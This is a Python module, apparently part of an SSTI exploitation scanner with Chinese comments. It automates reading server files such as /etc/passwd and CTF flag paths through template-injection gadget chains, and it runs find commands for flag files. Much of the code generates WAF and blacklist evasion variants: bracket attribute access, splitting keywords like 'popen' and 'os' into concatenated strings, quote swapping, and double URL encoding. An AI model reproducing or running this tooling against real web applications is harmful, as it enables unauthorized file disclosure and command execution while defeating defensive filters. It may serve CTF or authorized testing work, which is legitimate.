import re

from proj.payloads import FILE_READ_PAYLOADS, FLAG_SEARCH_COMMANDS, FLAG_COMMON_PATHS


class FileReadMixin:
    """負責 token 產生/擷取、讀檔 payload 執行、flag/passwd 搜尋。"""

    FILE_READ_PAYLOADS = FILE_READ_PAYLOADS
    FLAG_SEARCH_COMMANDS = FLAG_SEARCH_COMMANDS
    FLAG_COMMON_PATHS = FLAG_COMMON_PATHS

    @staticmethod
    def _make_token():
        """產生本次讀取專用的唯一標記，避免與頁面既有內容或前次殘留輸出混淆"""
        import random
        import string
        return ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))

    @staticmethod
    def _extract_by_token(probe_text, token):
        """
        在回應中尋找 SSTI_<token>_START_ 與 SSTI_<token>_END_ 之間的內容並回傳。
        因為 token 是每次讀取隨機產生，不會與頁面固有內容混淆，抓不到就是真的
        沒有命中（gadget 失敗、被過濾等），不像逐行 diff 基準頁面那樣在頁面本身
        會變動時（時間戳、隨機區塊等）產生誤判或抓到不完整的內容。

        取最後一個匹配而非第一個：某些 API（例如把送出的原始值連同渲染結果
        一併回傳的 debug/echo 端點）會在回應裡把「未渲染的原始 payload」與
        「渲染後的輸出」都包含進去——若該 API 把輸入欄位放在輸出欄位之前，
        原始 payload 字面文字本身就會意外形成一組完整的 START...END 配對，
        排在真正執行結果之前。用 search()（等同取第一個）會抓到這段尚未渲染
        的原始文字，誤判為未命中；取最後一個匹配則對應「回應結構中排最後、
        最可能是實際渲染輸出」的那一段。

        底線在 pattern 中做成可選（'_'? ）而非強制字面比對：部分目標會對輸出
        內容做無差別的符號過濾（例如整段拿掉所有底線字元，不論是否位於模板
        語法內），這種過濾跟 payload 有沒有被引擎正確執行無關，純粹是渲染前後
        的字元轉寫。若 marker 比對死板要求底線存在，這類目標會讓每一次讀檔/
        偵測都誤判為未命中，即使 gadget 其實已成功執行。放寬這一個字元不會
        增加誤判風險：token 本身仍是每次讀取隨機產生的高熵英數字串，加上
        SSTI/START/END 等固定詞彙同時出現在同一段落，巧合命中的機率可忽略。
        """
        if not probe_text:
            return None
        marker_re = lambda label: r'SSTI_?' + re.escape(token) + r'_?' + label + r'_?'
        pattern = re.compile(
            marker_re('START') + r'(.*?)' + marker_re('END'),
            re.S
        )
        matches = pattern.findall(probe_text)
        if not matches:
            return None
        return matches[-1].strip('\r\n').strip()

    # 對應 FiltersMixin.detect_filters 測過的每個過濾項目，代表「一條 gadget chain
    # 若含有這些字面關鍵字，就依賴該項目對應的能力」。用來讓 read_file 在送出前，
    # 依據已知的過濾偵測結果（self.filters）提前跳過注定會被擋下的 chain，而不是
    # 明知關鍵字被 BLOCKED 仍逐條送出去試——見 read_file 的呼叫端 core.py，
    # detect_filters 一定先於 read_file 執行，self.filters 在此已是最新結果。
    _FILTER_KEYWORD_MAP = (
        ('os_keyword', ('.os.', "['os']", '__import__(\'os\')', '__import__("os")')),
        ('popen_keyword', ('popen',)),
        ('class_keyword', ('__class__',)),
        ('read_keyword', ('.read()',)),
    )

    def _chain_blocked_by_known_filters(self, payload):
        """
        依 self.filters（detect_filters 的結果）判斷這條 payload 是否依賴已知
        被擋的關鍵字。self.filters 為空（尚未跑過 detect_filters）時視為無資訊、
        不跳過任何 chain，避免誤殺——只有在明確偵測到 BLOCKED 時才跳過。
        """
        if not self.filters:
            return None
        for filter_key, keywords in self._FILTER_KEYWORD_MAP:
            if self.filters.get(filter_key) and any(kw in payload for kw in keywords):
                return filter_key
        return None

    # 關鍵字被擋不代表該 gadget 整條路都走不通——多數黑名單/WAF 是對「固定
    # 字面關鍵字」或「固定語法寫法」做比對，只要換一種語意相同但外觀不同的
    # 寫法，往往就能繞過去。這裡定義一組「原始寫法 -> 替代寫法」的字串轉換，
    # 依序嘗試套用在同一條 payload 上，而不是偵測到關鍵字被擋就直接放棄整條
    # chain。轉換之間可疊加（例如先把 . 換成 []，再把字串常數拆成拼接）。
    _BYPASS_TRANSFORMS = (
        # 屬性存取的點記法 -> 中括號記法：繞過對 "." 或特定 ".os"/".popen" 字面比對的規則
        ('dot_to_bracket', lambda s: re.sub(
            r"\.([A-Za-z_][A-Za-z0-9_]*)\(", r"['\1'](", s)),
        ('dot_to_bracket_attr', lambda s: re.sub(
            r"\.([A-Za-z_][A-Za-z0-9_]*)\b(?!\()", r"['\1']", s)),
        # 單引號 <-> 雙引號互換：繞過只擋單一種引號寫法的規則
        ('quote_swap', lambda s: s.translate(str.maketrans({"'": '"', '"': "'"}))),
        # 把常見敏感關鍵字拆成兩段字串相加，繞過對完整關鍵字做子字串比對的規則
        # （例如黑名單擋連續字面 "popen"，但不會逐一擋 'pop'+'en' 這種拆開的片段）。
        # 同時處理「方法呼叫」寫法（.popen(...) -> ['pop'+'en'](...)）與「字串常數」
        # 寫法（'popen' -> 'pop'+'en'，適用於已經是 bracket 形式的變體）。
        ('split_popen', lambda s: re.sub(r"\.popen\(", "['pop'+'en'](", s)
            .replace("'popen'", "'pop'+'en'").replace('"popen"', '"pop"+"en"')),
        ('split_os', lambda s: re.sub(r"(['\"])os\1", lambda m: f"{m.group(1)}o{m.group(1)}+{m.group(1)}s{m.group(1)}", s)),
        # __class__ 拆成中括號存取兩段字串相加，繞過對 "__class__" 整段字面比對的規則
        ('split_class', lambda s: s.replace(".__class__", "['__cla'+'ss__']")),
    )

    # 上面 _BYPASS_TRANSFORMS 的字串拆分只認得 popen/os/__class__ 三個寫死關鍵字，
    # 遇到黑名單擋其他敏感字（read、exec、import、Runtime、ProcessBuilder、
    # ProcessBuilder、system 等）時完全沒有對應轉換，只能整條 chain 放棄。這裡
    # 改成通用版：只要關鍵字實際出現在 payload 字面中，就自動從中點拆成兩段
    # 字串相加，不需要為每個關鍵字各寫一條專屬 lambda。
    #
    # 用「中點拆分」而非任意位置：太靠邊界（例如拆成 1+len-1）容易剛好落在
    # 常見子字串規則的邊界外側，起不到繞過效果；中點拆分讓黑名單最常見的
    # 「完整關鍵字子字串比對」規則兩側都拿不到完整關鍵字。
    _GENERIC_SPLIT_KEYWORDS = (
        'read', 'exec', 'import', 'Runtime', 'ProcessBuilder', 'system',
        'eval', 'popen', 'subprocess', 'os', 'Files', 'getRuntime',
    )

    @classmethod
    def _split_keyword_in_string_literal(cls, s, keyword):
        """
        把 payload 中出現在字串常數（單引號或雙引號包住）裡的 keyword 字面，
        從中點拆成兩段用 + 相加，其餘位置的 keyword（例如已經是變數名/屬性名
        的一部分）不動，避免破壞語法。
        """
        if len(keyword) < 4 or keyword not in s:
            return s
        mid = len(keyword) // 2
        left, right = keyword[:mid], keyword[mid:]

        def repl(m):
            quote = m.group(1)
            return f"{quote}{left}{quote}+{quote}{right}{quote}"

        pattern = re.compile(r"(['\"])" + re.escape(keyword) + r"\1")
        return pattern.sub(repl, s)

    # get_param/form_get 這兩種注入點的 payload 最終會先被 http_client.py 的
    # urllib.parse.urlencode() 編碼一次才送上線；若在這之前就先對 payload 字串
    # 做一次 urllib.parse.quote()，等於預先編碼，會被 urlencode() 再編碼一次，
    # 使線路上的位元組變成雙重編碼（例如 "." -> "%2e" -> "%252e"）。許多 WAF
    # 規則只對請求做「解碼一次」後的內容比對特徵字串，看到 %252e 這種殘留的
    # 字面 % 不會再次解碼還原成 "."，因而放行；但應用層框架/伺服器本身在做
    # URL 參數解碼時，有些會遞迴/重複解碼（或用了本身就會處理常見雙重編碼的
    # 元件），實際仍會還原成原始 payload 而被模板引擎執行到。這與 payload 語法
    # 本身的轉寫（如 _BYPASS_TRANSFORMS）是不同維度的繞過，只對走 URL query
    # string 的注入點有意義，故不放進 _BYPASS_TRANSFORMS／_generate_bypass_variants
    # 這種對任何注入點一視同仁套用的清單，而是由呼叫端依 point 類型另外嘗試。
    _URL_ENCODABLE_PTYPES = ('get_param', 'form_get')

    @staticmethod
    def _double_url_encode(payload):
        import urllib.parse
        return urllib.parse.quote(payload, safe='')

    def _generate_generic_split_variants(self, template, payload_for_scan):
        """
        對 _GENERIC_SPLIT_KEYWORDS 中「實際出現在這條 payload 字面字串常數裡」
        的關鍵字，逐一產生拆分變體；不像 _BYPASS_TRANSFORMS 需要預先在
        _FILTER_KEYWORD_MAP 登記才能觸發，任何字面關鍵字都能自動嘗試。
        """
        variants = []
        seen = {template}
        for kw in self._GENERIC_SPLIT_KEYWORDS:
            if f"'{kw}'" not in payload_for_scan and f'"{kw}"' not in payload_for_scan:
                continue
            variant = self._split_keyword_in_string_literal(template, kw)
            if variant and variant not in seen:
                seen.add(variant)
                variants.append(variant)
        return variants

    def _generate_bypass_variants(self, template, blocked_keys, payload_for_scan=None):
        """
        依已知被擋的過濾項目（blocked_keys，來自 _chain_blocked_by_known_filters
        累積的結果），從 _BYPASS_TRANSFORMS 挑出可能有幫助的轉換，對原始
        template 產生一組替代寫法候選（不含 {{PATH}}/{{TOKEN}} 替換，交由呼叫端
        統一處理）。回傳依序嘗試的候選列表，第一個是原始寫法本身。

        payload_for_scan 提供時，額外套用 _generate_generic_split_variants：
        不限於 _FILTER_KEYWORD_MAP 登記過的四個關鍵字，任何實際出現在 payload
        字串常數裡的敏感字都會自動產生拆分變體，涵蓋黑名單擋 read/exec/import/
        Runtime 等目前 _BYPASS_TRANSFORMS 沒對應轉換的關鍵字。
        """
        variants = [template]
        relevant = []
        if 'os_keyword' in blocked_keys:
            relevant += ['dot_to_bracket_attr', 'split_os']
        if 'popen_keyword' in blocked_keys:
            relevant += ['dot_to_bracket', 'split_popen']
        if 'class_keyword' in blocked_keys:
            relevant += ['split_class']
        if 'read_keyword' in blocked_keys:
            relevant += ['dot_to_bracket']
        if 'dot' in blocked_keys or 'underscore' in blocked_keys:
            relevant += ['dot_to_bracket', 'dot_to_bracket_attr']
        if 'bracket' in blocked_keys:
            relevant += ['quote_swap']

        transform_map = dict(self._BYPASS_TRANSFORMS)
        seen = {template}
        # 先嘗試單一轉換，再嘗試把相關轉換兩兩疊加，涵蓋「同時擋多種寫法」的情況
        applied_single = []
        for name in dict.fromkeys(relevant):
            fn = transform_map.get(name)
            if not fn:
                continue
            try:
                variant = fn(template)
            except Exception:
                continue
            if variant and variant not in seen:
                seen.add(variant)
                variants.append(variant)
                applied_single.append((name, variant))

        for i in range(len(applied_single)):
            for j in range(i + 1, len(applied_single)):
                name_i, variant_i = applied_single[i]
                name_j, fn_j = applied_single[j][0], transform_map.get(applied_single[j][0])
                try:
                    combo = fn_j(variant_i)
                except Exception:
                    continue
                if combo and combo not in seen:
                    seen.add(combo)
                    variants.append(combo)

        generic_scan_target = payload_for_scan if payload_for_scan is not None else template
        for variant in self._generate_generic_split_variants(template, generic_scan_target):
            if variant not in seen:
                seen.add(variant)
                variants.append(variant)

        return variants

    @staticmethod
    def _gadget_try_count(total, level):
        """
        依 WAF/黑名單過濾強度（detect_filters 回傳的 level，0-10）決定要嘗試
        清單中前幾條候選 gadget chain：沒有過濾或過濾很弱時，最常見的第一條
        通常就會成功，不需要每次都把所有替代寫法送過去（多一次請求就多一次
        留下明顯攻擊特徵、也拖慢掃描）；過濾強度愈高，愈可能需要清單後段
        那些換用中括號/字串拼接/替代物件路徑來繞過關鍵字比對的變體，才逐步
        放寬到嘗試更多條，最高強度時才嘗試全部。
        與 _chain_blocked_by_known_filters 互補：後者跳過「已知一定被擋」的
        chain，這裡則是控制對「未知能否通過」的變體要嘗試到清單第幾條。
        """
        if level <= 0:
            cap = 1
        elif level <= 3:
            cap = 2
        elif level <= 6:
            cap = 4
        else:
            cap = total
        return max(1, min(cap, total))

    def _try_single_payload(self, point, payload, token, filepath, engine, idx, chain_label,
                             log_cb, result_cb, fail_markers):
        """
        送出單一 payload 並判斷是否讀檔成功，回傳 (success, extracted_or_None, text, status, elapsed)。
        被 read_file 的原始 chain 與繞過變體共用，避免重複同一段送出/擷取/回顯判斷邏輯。
        """
        text, status, elapsed = self.send_to_point(point, payload)

        if log_cb:
            log_cb(f"    [{chain_label}] payload: {payload}")
            log_cb(f"    [{chain_label}] status={status} elapsed={elapsed:.2f}s resp_len={len(text) if text else 0}")

        if status != 200 or not text:
            if log_cb:
                log_cb(f"    [{chain_label}] 跳過：status 非 200 或回應為空")
            if result_cb:
                result_cb({'phase': '讀檔', 'chain': f'{engine} #{idx+1}', 'cmd': f'cat {filepath}',
                           'status': f'失敗 (status={status}, {elapsed:.2f}s)', 'output': '', 'raw': text or ''})
            return False, None, text, status, elapsed

        extracted = self._extract_by_token(text, token)
        if extracted is None:
            if log_cb:
                log_cb(f"    [{chain_label}] 跳過：回應中找不到 token marker (SSTI_{token}_START_/_END_)，"
                       f"可能是 gadget 未執行、輸出被過濾/跳脫，或注入點選錯。回應片段: {text[:300]!r}")
            if result_cb:
                result_cb({'phase': '讀檔', 'chain': f'{engine} #{idx+1}', 'cmd': f'cat {filepath}',
                           'status': f'失敗 (找不到token marker, {elapsed:.2f}s)', 'output': '', 'raw': text})
            return False, None, text, status, elapsed

        # token 是嵌在 payload 字串裡面送出的，若目標只是把輸入原樣回顯
        # （例如錯誤頁把整個 payload 印出來、或「您輸入的是: ...」之類的
        # 頁面），markers 之間擷取到的內容會是 payload 字串本身（含 gadget
        # 原始碼），而不是指令真正的執行結果——必須先排除這種「回顯即命中」
        # 的誤判，否則會把 popen(...) 這段程式碼本身誤報為讀到的檔案內容。
        if extracted in payload:
            if log_cb:
                log_cb(f"    [{chain_label}] 跳過：擷取內容等同原始 payload 字串，判定為未執行的回顯: {extracted[:200]!r}")
            if result_cb:
                result_cb({'phase': '讀檔', 'chain': f'{engine} #{idx+1}', 'cmd': f'cat {filepath}',
                           'status': f'失敗 (判定為payload回顯, {elapsed:.2f}s)', 'output': '', 'raw': text})
            return False, None, text, status, elapsed

        if any(m in extracted for m in fail_markers):
            if log_cb:
                log_cb(f"    [{chain_label}] 跳過：擷取到內容但含錯誤字樣: {extracted[:200]!r}")
            if result_cb:
                result_cb({'phase': '讀檔', 'chain': f'{engine} #{idx+1}', 'cmd': f'cat {filepath}',
                           'status': f'失敗 (含錯誤字樣, {elapsed:.2f}s)', 'output': extracted[:2000], 'raw': text})
            return False, None, text, status, elapsed

        if log_cb:
            log_cb(f"    [+] [{chain_label}] 命中，擷取內容長度={len(extracted)}")
        if result_cb:
            result_cb({'phase': '讀檔', 'chain': f'{engine} #{idx+1}', 'cmd': f'cat {filepath}',
                       'status': f'成功 ({elapsed:.2f}s)', 'output': extracted[:2000], 'raw': text})
        return True, extracted, text, status, elapsed

    def read_file(self, point, engine, filepath, log_cb=None, result_cb=None, level=0):
        """
        在指定引擎下讀取單一檔案內容，依序嘗試該引擎候選 gadget chain（實際
        嘗試到清單第幾條由 level 決定，見 _gadget_try_count），任一條成功就
        回傳；全部失敗才回報失敗。回傳 (成功與否, 內容或錯誤訊息, 耗時, 使用的chain索引)。
        每條 payload 帶入獨立產生的 token，用來包裹指令輸出，回應解析時直接用
        token marker 定位擷取範圍，不依賴與基準頁面的內容比對。

        若提供 result_cb，每一條 chain 送出後、無論成功或失敗，都會立刻回報
        該次請求的原始 HTTP 回應內文（未經擷取/截斷處理），讓呼叫端能即時顯示
        「原始命令輸出」，而不必等到整個 read_file 執行完畢才看得到任何內容。

        送出前會先比對 self.filters（detect_filters 的結果）：若這條 chain 依賴
        的關鍵字已知被擋，「不會」直接放棄整條 chain——而是依 _generate_bypass_variants
        换用中括號存取/字串拼接/引號互換等替代寫法，重新產生一批變體逐一嘗試，
        只有原始寫法與全部變體都送出且失敗，才真正放棄這條 template、換下一條。
        """
        templates = self.FILE_READ_PAYLOADS.get(engine)
        if not templates:
            return False, f'{engine} 尚無讀檔 payload', 0, -1

        try_count = self._gadget_try_count(len(templates), level)
        templates = templates[:try_count]

        fail_markers = ['No such file', 'cannot find', 'command not found', 'Errno 2']
        last_text, last_elapsed = '', 0
        sent_count = 0

        for idx, template in enumerate(templates):
            token = self._make_token()
            payload = template.replace('{{PATH}}', filepath).replace('{{TOKEN}}', token)

            blocked_by = self._chain_blocked_by_known_filters(payload)
            # 除了 _FILTER_KEYWORD_MAP 登記過的四個關鍵字，只要 payload 字面
            # 字串常數中含有 _GENERIC_SPLIT_KEYWORDS 任一敏感字，也視為「可能
            # 需要繞過」，交給 _generate_bypass_variants 的通用拆分產生變體——
            # 不然黑名單擋的是 read/exec/import 等未登記關鍵字時，會完全沒有
            # 繞過路徑、只能整條 chain 直接放棄。
            has_generic_split_candidate = any(
                f"'{kw}'" in payload or f'"{kw}"' in payload
                for kw in self._GENERIC_SPLIT_KEYWORDS
            )
            candidate_templates = [template]
            if blocked_by or has_generic_split_candidate:
                # 累積所有已知被擋的過濾項目（不只這條 payload 命中的第一個），
                # 讓繞過變體產生器可以同時套用多種轉換
                blocked_keys = {
                    k for k, kws in self._FILTER_KEYWORD_MAP
                    if self.filters.get(k) and any(kw in payload for kw in kws)
                }
                variants = self._generate_bypass_variants(template, blocked_keys, payload_for_scan=payload)
                candidate_templates = variants
                if log_cb:
                    reason = f"依賴已知被擋關鍵字（{', '.join(sorted(blocked_keys))}）" if blocked_keys \
                        else "字面含未登記敏感關鍵字，預防性嘗試通用拆分"
                    log_cb(f"    [chain {idx+1}/{len(templates)}] 原始寫法{reason}，改嘗試 {len(variants)-1} 種"
                           f"繞過寫法（換中括號存取/字串拼接/引號互換/通用關鍵字拆分等），而非直接放棄此 chain")

            for v_idx, cand_template in enumerate(candidate_templates):
                v_token = token if v_idx == 0 else self._make_token()
                cand_payload = cand_template.replace('{{PATH}}', filepath).replace('{{TOKEN}}', v_token)
                label = f"chain {idx+1}/{len(templates)}" if v_idx == 0 else f"chain {idx+1} 繞過變體 {v_idx}/{len(candidate_templates)-1}"

                sent_count += 1
                success, extracted, text, status, elapsed = self._try_single_payload(
                    point, cand_payload, v_token, filepath, engine, idx, label, log_cb, result_cb, fail_markers)
                last_text, last_elapsed = text, elapsed

                if success:
                    return True, extracted, elapsed, idx

            # 所有語法層面的寫法變體都失敗，且此注入點會走 URL query string
            # （http_client.py 會再對整個值套 urlencode），最後嘗試對原始寫法
            # 做一次預先 URL encode，讓線路位元組變成雙重編碼，繞過只解碼一次
            # 的 WAF 規則（見 _double_url_encode 說明）。
            if point[0] in self._URL_ENCODABLE_PTYPES:
                de_token = self._make_token()
                de_payload = self._double_url_encode(payload.replace(token, de_token))
                sent_count += 1
                success, extracted, text, status, elapsed = self._try_single_payload(
                    point, de_payload, de_token, filepath, engine, idx,
                    f"chain {idx+1}/{len(templates)} 雙重URL編碼繞過", log_cb, result_cb, fail_markers)
                last_text, last_elapsed = text, elapsed
                if success:
                    return True, extracted, elapsed, idx
            # 這條 template 的原始寫法、所有繞過變體、雙重編碼皆失敗，換下一條候選 template

        if sent_count == 0 and templates:
            reason = f'{engine} 的全部 {len(templates)} 條 gadget chain 皆無法送出任何請求'
            if log_cb:
                log_cb(f"    [-] {reason}")
            return False, reason, 0, -1

        return False, last_text, last_elapsed, -1

    def search_flag_and_passwd(self, point, engine, log_cb, result_cb, level=0):
        """
        自動尋找 /etc/passwd 與常見 flag 路徑。read_file 內部已透過 result_cb
        在每一次請求送出後立即回報該次的原始回應（成功或失敗皆回報），
        這裡不再等整個搜尋跑完才彙整結果。level 為 detect_filters() 回傳的
        WAF/黑名單過濾強度（0-10），用來決定讀檔與 find 搜尋各自要嘗試清單中
        前幾條候選 gadget chain（見 _gadget_try_count）。
        """
        findings = []

        log_cb("[*] 讀取 /etc/passwd ...")
        success, output, elapsed, chain_idx = self.read_file(point, engine, '/etc/passwd', log_cb, result_cb, level=level)
        if success and 'root:' in output:
            log_cb(f"[+] /etc/passwd 讀取成功 ({elapsed:.2f}s)")
            log_cb(f"    {output[:500]}")
            findings.append({'target': '/etc/passwd', 'output': output})
        else:
            log_cb("[-] /etc/passwd 讀取失敗")

        log_cb("[*] 搜尋常見 flag 路徑 ...")
        for path in self.FLAG_COMMON_PATHS:
            if not self.scanning:
                break
            success, output, elapsed, chain_idx = self.read_file(point, engine, path, log_cb, result_cb, level=level)
            if success and output.strip():
                log_cb(f"[+] 找到 flag 檔案: {path}")
                log_cb(f"    {output[:300]}")
                findings.append({'target': path, 'output': output})

        search_cmds_all = self.FLAG_SEARCH_COMMANDS.get(engine, [])
        search_try_count = self._gadget_try_count(len(search_cmds_all), level) if search_cmds_all else 0
        search_cmds = search_cmds_all[:search_try_count]
        if search_cmds:
            log_cb(f"[*] 執行 find 搜尋 *flag* 檔案 (依過濾強度 {level}/10 嘗試 {len(search_cmds)}/{len(search_cmds_all)} 條 gadget)...")
            found = False
            for idx, search_cmd in enumerate(search_cmds):
                token = self._make_token()
                payload = search_cmd.replace('{{TOKEN}}', token)

                blocked_by = self._chain_blocked_by_known_filters(payload)
                has_generic_split_candidate = any(
                    f"'{kw}'" in payload or f'"{kw}"' in payload
                    for kw in self._GENERIC_SPLIT_KEYWORDS
                )
                candidate_cmds = [search_cmd]
                if blocked_by or has_generic_split_candidate:
                    blocked_keys = {
                        k for k, kws in self._FILTER_KEYWORD_MAP
                        if self.filters.get(k) and any(kw in payload for kw in kws)
                    }
                    candidate_cmds = self._generate_bypass_variants(search_cmd, blocked_keys, payload_for_scan=payload)
                    reason = f"依賴已知被擋關鍵字（{', '.join(sorted(blocked_keys))}）" if blocked_keys \
                        else "字面含未登記敏感關鍵字，預防性嘗試通用拆分"
                    log_cb(f"    [chain {idx+1}/{len(search_cmds)}] 原始寫法{reason}，改嘗試 {len(candidate_cmds)-1} 種繞過寫法")

                hit = False
                for c_idx, cand_cmd in enumerate(candidate_cmds):
                    c_token = token if c_idx == 0 else self._make_token()
                    cand_payload = cand_cmd.replace('{{TOKEN}}', c_token)
                    text, status, elapsed = self.send_to_point(point, cand_payload)
                    extracted = self._extract_by_token(text, c_token) if status == 200 else None
                    # 同 read_file()：擷取到的內容若等同未執行的原始 payload 字串，
                    # 代表只是回顯，不是真的執行了 find 指令
                    if extracted and extracted in cand_payload:
                        extracted = None
                    if extracted:
                        if idx > 0 or c_idx > 0:
                            log_cb(f"    [i] 第 {idx+1} 條 gadget chain"
                                   f"{'' if c_idx == 0 else f' 繞過變體 {c_idx}'} 命中")
                        log_cb("[+] find 搜尋結果:")
                        log_cb(f"    {extracted[:500]}")
                        findings.append({'target': 'find *flag*', 'output': extracted})
                        result_cb({'phase': '讀檔', 'chain': f'{engine} #{idx+1}', 'cmd': 'find *flag*',
                                   'status': f'成功 ({elapsed:.2f}s)', 'output': extracted[:2000], 'raw': text})
                        found = True
                        hit = True
                        break
                    else:
                        result_cb({'phase': '讀檔', 'chain': f'{engine} #{idx+1}', 'cmd': 'find *flag*',
                                   'status': f'失敗 (status={status}, {elapsed:.2f}s)', 'output': '', 'raw': text or ''})

                if not hit and point[0] in self._URL_ENCODABLE_PTYPES:
                    de_token = self._make_token()
                    de_payload = self._double_url_encode(payload.replace(token, de_token))
                    text, status, elapsed = self.send_to_point(point, de_payload)
                    extracted = self._extract_by_token(text, de_token) if status == 200 else None
                    if extracted and extracted in de_payload:
                        extracted = None
                    if extracted:
                        log_cb(f"    [i] 第 {idx+1} 條 gadget chain 雙重URL編碼繞過命中")
                        log_cb("[+] find 搜尋結果:")
                        log_cb(f"    {extracted[:500]}")
                        findings.append({'target': 'find *flag*', 'output': extracted})
                        result_cb({'phase': '讀檔', 'chain': f'{engine} #{idx+1}', 'cmd': 'find *flag*',
                                   'status': f'成功 ({elapsed:.2f}s)', 'output': extracted[:2000], 'raw': text})
                        found = True
                        hit = True

                if hit:
                    break
            if not found:
                log_cb("[-] find 搜尋無結果")

        log_cb(f"[*] 搜尋完成，共 {len(findings)} 項命中")
        return findings
